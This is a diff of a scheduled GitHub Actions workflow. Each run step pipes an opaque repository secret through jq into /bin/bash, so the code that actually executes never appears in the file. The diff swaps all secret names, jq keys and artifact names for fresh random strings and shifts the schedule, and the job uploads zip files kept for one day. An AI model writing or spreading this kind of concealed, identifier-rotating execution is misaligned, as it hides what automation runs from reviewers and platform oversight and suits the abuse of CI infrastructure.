@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '13 1,7,13,19 * * *'
+    - cron: '5 2,8,14,20 * * *'
 jobs:
   automation:
     runs-on: ubuntu-latest
@@ -12,20 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          dlaei649: ${{ secrets.dlaei649 }}
+          yuig1: ${{ secrets.yuig1 }}
         run: |
-          printf '%s' "$dlaei649" | jq -r .qygz044 | /bin/bash
-          echo $o65838 | jq -r .l00446 | /bin/bash
-          echo $o3 | jq -r .gwcqe2874 | /bin/bash
-          printf '%s' "$jjtkm4294" | jq -r .y70 | /bin/bash
-          printf '%s' "$sw55520" | jq -r .sz95733 | /bin/bash
-          echo $qvdj7 | jq -r .x173 | /bin/bash
-          echo $mew9 | jq -r .ufa8476 | /bin/bash
+          printf '%s' "$yuig1" | jq -r .klu71 | /bin/bash
+          echo $htgqx3116 | jq -r .d134 | /bin/bash
+          printf '%s' "$ir35082" | jq -r .pas32763 | /bin/bash
+          printf '%s' "$xef17" | jq -r .zms0 | /bin/bash
+          echo $kostf69 | jq -r .ragvn0 | /bin/bash
 
       - name: Store results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: eLv32MV4
+          name: g3xG8wlh
           path: "*.zip"
           retention-days: 1
